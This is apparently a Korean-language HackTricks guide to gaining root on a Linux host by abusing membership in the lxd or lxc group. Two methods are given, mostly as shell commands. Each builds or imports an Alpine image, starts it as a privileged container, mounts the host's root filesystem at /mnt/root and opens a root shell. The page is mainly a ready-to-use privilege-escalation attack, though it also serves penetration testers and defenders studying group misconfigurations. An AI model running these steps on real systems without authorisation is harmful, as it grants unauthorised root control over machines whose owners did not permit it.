# lxd/lxc 그룹 - 권한 상승

{{#include ../../../banners/hacktricks-training.md}}

당신이 _**lxd**_ **또는** _**lxc**_ **그룹**에 속한다면, 루트가 될 수 있습니다.

## 인터넷 없이 악용하기

### 방법 1

신뢰할 수 있는 저장소에서 lxd와 함께 사용할 alpine 이미지를 다운로드할 수 있습니다.  
Canonical은 그들의 사이트에 매일 빌드를 게시합니다: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
가장 최신 빌드에서 **lxd.tar.xz**와 **rootfs.squashfs**를 모두 가져오세요. (디렉토리 이름은 날짜입니다).

대안으로, 이 배포판 빌더를 당신의 머신에 설치할 수 있습니다: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (github의 지침을 따르세요):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
파일 **incus.tar.xz** (**Canonical 리포지토리에서 다운로드한 경우 **lxd.tar.xz**)와 **rootfs.squashfs**를 업로드하고, 이미지를 리포지토리에 추가한 후 컨테이너를 생성하세요:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> 이 오류를 발견하면 _**오류: 저장소 풀이 없습니다. 새 저장소 풀을 생성하십시오**_\
> **`lxd init`**를 실행하고 모든 옵션을 기본값으로 설정하십시오. 그런 다음 **이전 명령어 덩어리를 반복하십시오.**

마지막으로 컨테이너를 실행하고 root를 얻을 수 있습니다:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Method 2

Alpine 이미지를 빌드하고 `security.privileged=true` 플래그를 사용하여 시작하여 컨테이너가 호스트 파일 시스템과 루트로 상호 작용하도록 강제합니다.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
